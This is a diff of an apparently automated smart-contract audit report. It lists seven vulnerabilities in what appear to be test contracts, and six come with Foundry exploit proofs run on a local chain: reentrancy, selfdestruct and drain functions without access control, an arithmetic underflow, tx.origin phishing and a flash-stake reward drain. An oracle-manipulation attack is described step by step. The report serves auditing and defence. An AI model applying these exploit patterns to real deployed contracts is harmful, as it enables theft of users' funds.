@@ -19,9 +19,9 @@ Model: `gemini-3.5-flash-lite` · 10 contract(s) · 7 finding(s), 6 proven with 
 
 ## FlashFarm — logic-error (🔴 high) · ✅ PROVEN
 
-FlashFarm calculates rewards using instantaneous stake share rather than time-weighted balances, allowing an attacker to deposit massive capital in a single transaction to drain the entire reward pool. The attacker captures accumulated rewards meant for long-term stakers and immediately unstakes, causing a total loss of user funds.
+FlashFarm calculates reward shares based on instantaneous balances without a time-weighted average, allowing an attacker to deposit a massive stake and drain nearly the entire reward pool in a single transaction. By immediately claiming rewards and withdrawing their principal atomically, the attacker captures almost 100% of the newly funded rewards at the expense of legitimate long-term stakers.
 
-**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `989010989010989010989`.
+**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `999999000000999999000`.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -30,36 +30,38 @@ pragma solidity ^0.8.20;
 import {ExploitProof} from "@proof/ExploitProof.sol";
 import {FlashFarm, Token} from "@contracts/FlashFarm.sol";
 
-contract ProveFlashFarmLeadOne is ExploitProof {
+contract ProveFlashFarmFlashFarmInstantaneousRewardDrain is ExploitProof {
     function test_exploit() external {
         Token stakeToken = new Token();
         Token rewardToken = new Token();
         FlashFarm farm = new FlashFarm(stakeToken, rewardToken);
 
         address alice = makeAddr("alice");
-        stakeToken.mint(alice, 100 ether);
-        rewardToken.mint(address(this), 1000 ether);
+        address attacker = makeAddr("attacker");
 
-        rewardToken.approve(address(farm), 1000 ether);
-        farm.fund(1000 ether);
+        // Honest staker stakes 1 token
+        stakeToken.mint(alice, 1e18);
+        vm.prank(alice);
+        stakeToken.approve(address(farm), 1e18);
+        vm.prank(alice);
+        farm.stake(1e18);
 
-        vm.startPrank(alice);
-        stakeToken.approve(address(farm), 100 ether);
-        farm.stake(100 ether);
-        vm.stopPrank();
+        // Reward pool funded with 1000 tokens
+        rewardToken.mint(address(this), 1000e18);
+        rewardToken.approve(address(farm), 1000e18);
+        farm.fund(1000e18);
 
-        address payable attacker = payable(makeAddr("attacker"));
-        stakeToken.mint(attacker, 9000 ether);
-
+        // Attacker stakes a massive amount (e.g. 1,000,000 tokens)
+        stakeToken.mint(attacker, 1_000_000e18);
         vm.startPrank(attacker);
-        stakeToken.approve(address(farm), 9000 ether);
-        farm.stake(9000 ether);
+        stakeToken.approve(address(farm), 1_000_000e18);
+        farm.stake(1_000_000e18);
         farm.claim();
-        farm.unstake(9000 ether);
+        farm.unstake(1_000_000e18);
         vm.stopPrank();
 
         profit = rewardToken.balanceOf(attacker);
-        assertExploitLanded(900 ether);
+        assertExploitLanded(900e18);
     }
 }
 ```
@@ -70,7 +72,7 @@ contract ProveFlashFarmLeadOne is ExploitProof {
 
 ## GlassJaw — unprotected-selfdestruct (🔴 high) · ✅ PROVEN
 
-GlassJaw.demolish lacks access control, allowing any caller to directly execute selfdestruct and drain the contract's entire native token balance, including all user deposits, to the attacker's address.
+GlassJaw lacks access control on demolish(), allowing any caller to invoke selfdestruct() directly and siphon the contract's entire native ETH balance. This instantly terminates the contract and forces a complete loss of funds.
 
 **Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.
 
@@ -82,18 +84,18 @@ import {GlassJaw} from "@contracts/GlassJaw.sol";
 
 contract ProveGlassJawLeadOne is ExploitProof {
     function test_exploit() external {
-        GlassJaw g = new GlassJaw();
+        GlassJaw v = new GlassJaw();
         address alice = makeAddr("alice");
         vm.deal(alice, 10 ether);
         vm.prank(alice);
-        g.deposit{value: 10 ether}();
+        v.deposit{value: 10 ether}();
 
         address payable attacker = payable(makeAddr("attacker"));
         vm.prank(attacker);
-        g.demolish(attacker);
+        v.demolish(attacker);
 
         profit = attacker.balance;
-        assertExploitLanded(5 ether);
+        assertExploitLanded(10 ether);
     }
 }
 ```
@@ -104,7 +106,7 @@ contract ProveGlassJawLeadOne is ExploitProof {
 
 ## HallOfMirrors — price-oracle-manipulation (🔴 high) · unconfirmed
 
-An attacker borrows cash via QuickLoan, uses it to swap for stake in MirrorPool to artificially inflate the spot price of stake, pledges a small amount of stake to PawnShop at the manipulated high price to draw a massive amount of cash, swaps back to normalize or leaves the pool, and repays the flash loan, extracting cash from PawnShop and leaving bad debt.
+An attacker implements the Borrower interface and calls QuickLoan.borrow to obtain cash flash-loan liquidity. Inside onFlashLoan, the attacker uses the borrowed cash to call MirrorPool.swapCashForStake, artificially inflating the spot price of the stake token in the AMM. The attacker then pledges a small amount of stake to PawnShop and calls PawnShop.draw to borrow massive amounts of cash against the manipulated collateral price. Finally, the attacker swaps stake back for cash in MirrorPool, repays the flash loan, and walks away with unbacked cash profit.
 
 **Remediation.** Do not use an AMM spot price as an oracle. Use a TWAP, a dedicated price feed, or a manipulation-resistant source, and sanity-check against a second source.
 
@@ -112,7 +114,7 @@ An attacker borrows cash via QuickLoan, uses it to swap for stake in MirrorPool 
 
 ## HollowVault — reentrancy (🔴 high) · ✅ PROVEN
 
-HollowVault suffers from a classic reentrancy vulnerability because state updates (`balances[msg.sender] = 0`) occur after transferring ETH. An attacker exploits this by recursively calling `withdraw()` inside their fallback function to drain the vault's entire balance in a single transaction.
+HollowVault fails to follow the checks-effects-interactions pattern, allowing an attacker to recursively invoke withdraw() via a fallback function before balances are zeroed. This drains the vault's entire ETH balance in a single transaction.
 
 **Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.
 
@@ -125,14 +127,9 @@ import {HollowVault} from "@contracts/HollowVault.sol";
 contract Raider {
     HollowVault v;
     constructor(HollowVault _v) payable { v = _v; }
-    function go() external {
-        v.deposit{value: 1 ether}();
-        v.withdraw();
-    }
+    function go() external { v.deposit{value: 1 ether}(); v.withdraw(); }
     receive() external payable {
-        if (address(v).balance >= 1 ether) {
-            v.withdraw();
-        }
+        if (address(v).balance >= 1 ether) v.withdraw();
     }
 }
 
@@ -141,8 +138,7 @@ contract ProveHollowVaultLeadOne is ExploitProof {
         HollowVault v = new HollowVault();
         address alice = makeAddr("alice");
         vm.deal(alice, 10 ether);
-        vm.prank(alice);
-        v.deposit{value: 10 ether}();
+        vm.prank(alice); v.deposit{value: 10 ether}();
 
         Raider raider = new Raider{value: 1 ether}(v);
         raider.go();
@@ -159,7 +155,7 @@ contract ProveHollowVaultLeadOne is ExploitProof {
 
 ## LooseLedger — arithmetic (🔴 high) · ✅ PROVEN
 
-The contract performs point deductions inside an `unchecked` block, allowing an out-of-bounds `spend` call to underflow the caller's balance to a near-infinite value. The attacker exploits this massive balance to immediately drain the contract's ETH reserves.
+An unchecked arithmetic block allows `spend()` to underflow the caller's points balance when spending more than owned, yielding near `type(uint256).max`. This grants the attacker a massive balance, enabling them to drain the contract's entire ETH reserves.
 
 **Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `5000000000000000000`.
 
@@ -177,7 +173,7 @@ contract ProveLooseLedgerLeadOne is ExploitProof {
         // Fund the ledger so it has ETH to drain
         vm.deal(address(ledger), 10 ether);
 
-        // Attacker spends 5 ether without having any points, causing an underflow
+        // Attacker calls spend without any points, triggering the underflow and payout
         vm.prank(attacker);
         ledger.spend(5 ether);
 
@@ -193,7 +189,7 @@ contract ProveLooseLedgerLeadOne is ExploitProof {
 
 ## OpenTill — access-control (🔴 high) · ✅ PROVEN
 
-The `OpenTill.drain()` function lacks access control modifiers, allowing any caller to invoke it directly. An attacker passes their own address as a parameter to immediately transfer the entire Ether balance of the contract in a single transaction, resulting in a total loss of funds.
+The `OpenTill.drain` function lacks access control modifiers, allowing any external actor to pass their own address as a parameter. Calling this function immediately transfers the contract's entire Ether balance to the attacker, resulting in a total loss of funds.
 
 **Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.
 
@@ -216,7 +212,7 @@ contract ProveOpenTillOpenTillUnprotectedDrain is ExploitProof {
         till.drain(attacker);
 
         profit = attacker.balance;
-        assertExploitLanded(5 ether);
+        assertExploitLanded(1 ether);
     }
 }
 ```
@@ -227,9 +223,9 @@ contract ProveOpenTillOpenTillUnprotectedDrain is ExploitProof {
 
 ## OriginGate — tx-origin-auth (🔴 high) · ✅ PROVEN
 
-Using `tx.origin` for authentication in `OriginGate.withdraw` allows attackers to drain contract funds by tricking the owner into calling a malicious intermediary contract. Because `tx.origin` evaluates to the transaction initiator rather than the immediate caller, the malicious contract successfully impersonates the owner and steals the entire balance.
+The contract relied on `tx.origin` for access control, allowing an attacker to deploy a malicious intermediary contract that tricked the owner into calling it. When the victim interacted with the exploit contract, it successfully passed the `tx.origin == owner` check inside `OriginGate.withdraw` and drained all protocol funds.
 
-**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `5000000000000000000`.
+**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -237,20 +233,18 @@ pragma solidity ^0.8.20;
 import {ExploitProof} from "@proof/ExploitProof.sol";
 import {OriginGate} from "@contracts/OriginGate.sol";
 
-contract Attacker {
+contract MaliciousCaller {
     OriginGate gate;
-    address payable target;
+    address payable attacker;
 
-    constructor(OriginGate _gate, address payable _target) {
+    constructor(OriginGate _gate, address payable _attacker) {
         gate = _gate;
-        target = _target;
+        attacker = _attacker;
     }
 
     function attack() external {
-        gate.withdraw(target, address(gate).balance);
+        gate.withdraw(attacker, address(gate).balance);
     }
-
-    receive() external payable {}
 }
 
 contract ProveOriginGateLeadOne is ExploitProof {
@@ -262,16 +256,15 @@ contract ProveOriginGateLeadOne is ExploitProof {
         
         OriginGate gate;
         vm.prank(owner);
-        gate = new OriginGate{value: 5 ether}();
+        gate = new OriginGate{value: 10 ether}();
 
-        Attacker atk = new Attacker(gate, attacker);
+        MaliciousCaller malicious = new MaliciousCaller(gate, attacker);
 
-        // Owner is tricked into calling the malicious contract, which drains OriginGate via tx.origin
         vm.prank(owner, owner);
-        atk.attack();
+        malicious.attack();
 
         profit = attacker.balance;
-        assertExploitLanded(1 ether);
+        assertExploitLanded(5 ether);
     }
 }
 ```
